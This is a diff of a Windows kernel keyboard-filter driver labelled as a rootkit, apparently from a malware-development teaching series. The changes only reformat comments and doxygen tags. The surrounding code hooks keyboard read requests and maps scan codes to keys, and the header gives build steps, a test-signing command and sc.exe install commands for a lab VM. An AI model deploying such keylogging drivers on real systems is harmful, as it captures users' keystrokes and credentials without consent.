@@ -3,25 +3,25 @@
 
 
 
-// Name:							KernelRootkit007_KeyboardFilter
-// IDE:								Open Visual Studio
-// Template:						Create a new project -> Search for templates (Alt + S) -> Kernel Mode Driver, Empty (KMDF) -> Next
-// Project:							Project Name: KMDFDriver_KeyboardFilter -> Solution Name: KernelRootkit007_KeyboardFilter -> Create
-// Source File:						Source Files -> Add -> New Item... -> Driver.c
-// Source Code:						Open Driver.c and copy the corresponding source code
-// Build Project:					Set Configuration to Release, x64 -> Build -> Build Solution
-// Locate Driver:					C:\Users\%USERNAME%\source\repos\KernelRootkit007_KeyboardFilter\x64\Release\KMDFDriver_KeyboardFilter.sys
-// Virtual Machine:					Open VMware Workstation -> Power on (MalwareWindows11) virtual machine
-// Move Driver:						Copy KMDFDriver_KeyboardFilter.sys (Host) to C:\Users\%USERNAME%\Downloads\KMDFDriver_KeyboardFilter.sys (VM)
-// Enable Test Mode:				Open a CMD window as Administrator -> bcdedit /set testsigning on -> Restart
-// Driver Installation:				Open a CMD window as Administrator -> sc.exe create WindowsKernelKeyboardFilter type=kernel start=demand binpath="C:\Users\%USERNAME%\Downloads\KMDFDriver_KeyboardFilter.sys"
-// Registered Driver:				Open AutoRuns as Administrator -> Navigate to the Drivers tab -> Look for WindowsKernelKeyboardFilter
-// Service Status:					Run in CMD as Administrator -> sc.exe query WindowsKernelKeyboardFilter -> driverquery.exe
-// Registry Entry:					Open regedit -> Navigate to HKLM\SYSTEM\CurrentControlSet\Services -> Look for WindowsKernelKeyboardFilter
-// Monitor Messages:				Open DebugView as Administrator -> Enable options ("Capture -> Capture Kernel" and "Capture -> Enable Verbose Kernel Output") -> Close and reopen DebugView as Administrator
-// Start Routine:					Run in CMD as Administrator -> sc.exe start WindowsKernelKeyboardFilter
-// Clean:							Run in CMD as Administrator -> sc.exe stop WindowsKernelKeyboardFilter
-// Remove:							Run in CMD as Administrator -> sc.exe delete WindowsKernelKeyboardFilter
+// Name:                            KernelRootkit007_KeyboardFilter
+// IDE:                             Open Visual Studio
+// Template:                        Create a new project -> Search for templates (Alt + S) -> Kernel Mode Driver, Empty (KMDF) -> Next
+// Project:                         Project Name: KMDFDriver_KeyboardFilter -> Solution Name: KernelRootkit007_KeyboardFilter -> Create
+// Source File:                     Source Files -> Add -> New Item... -> Driver.c
+// Source Code:                     Open Driver.c and copy the corresponding source code
+// Build Project:                   Set Configuration to Release, x64 -> Build -> Build Solution
+// Locate Driver:                   C:\Users\%USERNAME%\source\repos\KernelRootkit007_KeyboardFilter\x64\Release\KMDFDriver_KeyboardFilter.sys
+// Virtual Machine:                 Open VMware Workstation -> Power on (MalwareWindows11) virtual machine
+// Move Driver:                     Copy KMDFDriver_KeyboardFilter.sys (Host) to C:\Users\%USERNAME%\Downloads\KMDFDriver_KeyboardFilter.sys (VM)
+// Enable Test Mode:                Open a CMD window as Administrator -> bcdedit /set testsigning on -> Restart
+// Driver Installation:             Open a CMD window as Administrator -> sc.exe create WindowsKernelKeyboardFilter type=kernel start=demand binpath="C:\Users\%USERNAME%\Downloads\KMDFDriver_KeyboardFilter.sys"
+// Registered Driver:               Open AutoRuns as Administrator -> Navigate to the Drivers tab -> Look for WindowsKernelKeyboardFilter
+// Service Status:                  Run in CMD as Administrator -> sc.exe query WindowsKernelKeyboardFilter -> driverquery.exe
+// Registry Entry:                  Open regedit -> Navigate to HKLM\SYSTEM\CurrentControlSet\Services -> Look for WindowsKernelKeyboardFilter
+// Monitor Messages:                Open DebugView as Administrator -> Enable options ("Capture -> Capture Kernel" and "Capture -> Enable Verbose Kernel Output") -> Close and reopen DebugView as Administrator
+// Start Routine:                   Run in CMD as Administrator -> sc.exe start WindowsKernelKeyboardFilter
+// Clean:                           Run in CMD as Administrator -> sc.exe stop WindowsKernelKeyboardFilter
+// Remove:                          Run in CMD as Administrator -> sc.exe delete WindowsKernelKeyboardFilter
 
 
 
@@ -45,7 +45,7 @@
 	@brief		This structure is used as an extension to the device object for keyboard-related operations.
 
 
-				PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
+	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
 	@param		LowerKeyboardDevice		Pointer to the lower-level keyboard device object.
 **/
 typedef struct {
@@ -59,23 +59,19 @@ typedef struct {
 	@brief		This structure represents information related to keyboard input events.
 
 
-				USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
+	@see		USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
 	@param		UnitId				Specifies the unit number of a keyboard device. A keyboard device name has the format \Device\KeyboardPortN, where the suffix N is the unit number of the device. For example, a device, whose name is \Device\KeyboardPort0, has a unit number of zero, and a device, whose name is \Device\KeyboardPort1, has a unit number of one.
 
-
-				USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
+	@see		USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
 	@param		MakeCode			Specifies the scan code associated with a key press.
 
-
-				USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
+	@see		USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
 	@param		Flags				Specifies a bitwise OR of one or more of the following flags that indicate whether a key was pressed or released, and other miscellaneous information.
 
-
-				USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
+	@see		USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#USHORT
 	@param		Reserved			Reserved for operating system use.
 
-
-				USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#ULONG
+	@see		USHORT				https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#ULONG
 	@param		ExtraInformation	Specifies device-specific information associated with a keyboard event.
 **/
 typedef struct _KEYBOARD_INPUT_DATA {
@@ -94,9 +90,11 @@ typedef struct _KEYBOARD_INPUT_DATA {
 
 
 
-PDEVICE_OBJECT Global_MyKeyboardDevice = NULL;		// Pointer to device object for keyboard driver
-ULONG Global_PendingKey = 0;						// Counter to track the number of pending keyboard input events
-
+// Pointer to device object for keyboard driver
+PDEVICE_OBJECT Global_MyKeyboardDevice = NULL;
+// Counter to track the number of pending keyboard input events
+ULONG Global_PendingKey = 0;
+// Global table for mapping keyboard scan codes (0–255) to their ASCII-equivalent key labels
 static const char* Global_ScanCodeToAscii[256] = {
 	"", "Esc", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "Backspace", "Tab", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "Enter", "Ctrl", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "Shift", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "Shift", "*", "Alt", "Space", "CapsLock", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NumLock", "ScrollLock", "Home", "Up", "PgUp", "-", "Left", "Center", "Right", "+", "End", "Down", "PgDn", "Insert", "Delete"
 };
@@ -110,12 +108,11 @@ static const char* Global_ScanCodeToAscii[256] = {
 
 /**
 	@brief		Unloads a Windows kernel-mode driver.
+	@details	This function is called when the driver is being unloaded from memory. It is responsible for cleaning up resources and performing necessary cleanup tasks before the driver is removed from the system. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload
 
-				This function is called when the driver is being unloaded from memory. It is responsible for cleaning up resources and performing necessary cleanup tasks before the driver is removed from the system. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload
 
-
-				PDRIVER_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
-	@param		pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver.
+	@see		PDRIVER_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
+	@param[in]	pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver.
 **/
 VOID
 DriverUnload(
@@ -187,20 +184,19 @@ DriverUnload(
 	@brief		A passthrough function for handling IRPs (I/O Request Packets).
 
 
-				PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
-	@param		pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.
+	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
+	@param[in]	pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.
 
-
-				PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
-	@param		pIrp					Pointer to an IRP (I/O Request Packet) to be processed.
+	@see		PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
+	@param[in]	pIrp					Pointer to an IRP (I/O Request Packet) to be processed.
 
 
 	@return		A NTSTATUS value indicating success or an error code if operation fails.
 **/
 NTSTATUS
 DriverPassthrough(
-	_In_	PDEVICE_OBJECT				pDeviceObject,
-	_In_	PIRP						pIrp
+	_In_		PDEVICE_OBJECT			pDeviceObject,
+	_In_		PIRP					pIrp
 )
 {
 	// ---------------------------------------------------------------------------------------------------------------------
@@ -235,16 +231,14 @@ DriverPassthrough(
 	@brief		Callback function invoked upon completion of a read operation.
 
 
-				PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
-	@param		pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.
+	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
+	@param[in]	pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.
 
+	@see		PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
+	@param[in]	pIrp					Pointer to an IRP (I/O request packet) for the read operation.
 
-				PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
-	@param		pIrp					Pointer to an IRP (I/O request packet) for the read operation.
-
-
-				PVOID					https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#PVOID
-	@param		pcontext				User-defined context parameter.
+	@see		PVOID					https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#PVOID
+	@param[in]	pcontext				User-defined context parameter.
 
 
 	@return		A NTSTATUS value indicating success or an error code if operation fails.
@@ -326,12 +320,11 @@ DriverCompletionRoutine(
 	@brief		Function to read keystrokes from keyboard device.
 
 
-				PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
-	@param		pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.
+	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
+	@param[in]	pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.
 
-
-				PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
-	@param		pIrp					Pointer to the I/O request packet (IRP) for reading keystrokes.
+	@see		PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
+	@param[in]	pIrp					Pointer to the I/O request packet (IRP) for reading keystrokes.
 
 
 	@return		A NTSTATUS value indicating success or an error code if operation fails.
@@ -372,19 +365,20 @@ DriverReadKeystrokes(
 }
 
 
+
 /**
 	@brief		Attaches the keyboard device to the driver.
 
 
-				PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
-	@param		pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.
+	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
+	@param[in]	pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.
 
 
 	@return		A NTSTATUS value indicating success or an error code if operation fails.
 **/
 NTSTATUS
 DriverAttachKeyboard(
-	_In_	PDRIVER_OBJECT				pDriverObject
+	_In_		PDRIVER_OBJECT			pDriverObject
 )
 {
 	// ---------------------------------------------------------------------------------------------------------------------
@@ -454,15 +448,14 @@ DriverAttachKeyboard(
 
 /**
 	@brief		Entry point for a Windows kernel-mode driver.
-	
-				This function is called when the driver is loaded into memory. It initializes the driver and performs necessary setup tasks. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers
+	@details	This function is called when the driver is loaded into memory. It initializes the driver and performs necessary setup tasks. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers
 
 
-				PDRIVER_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
-	@param		pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.
+	@see		PDRIVER_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
+	@param[in]	pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.
 
-				PUNICODE_STRING			https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string
-	@param		pRegistryPath			Pointer to a UNICODE_STRING structure, containing the driver's registry path as a Unicode string, indicating the driver's location in the Windows registry.
+	@see		PUNICODE_STRING			https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string
+	@param[in]	pRegistryPath			Pointer to a UNICODE_STRING structure, containing the driver's registry path as a Unicode string, indicating the driver's location in the Windows registry.
 
 
 	@return		A NTSTATUS value indicating success or an error code if initialization fails.
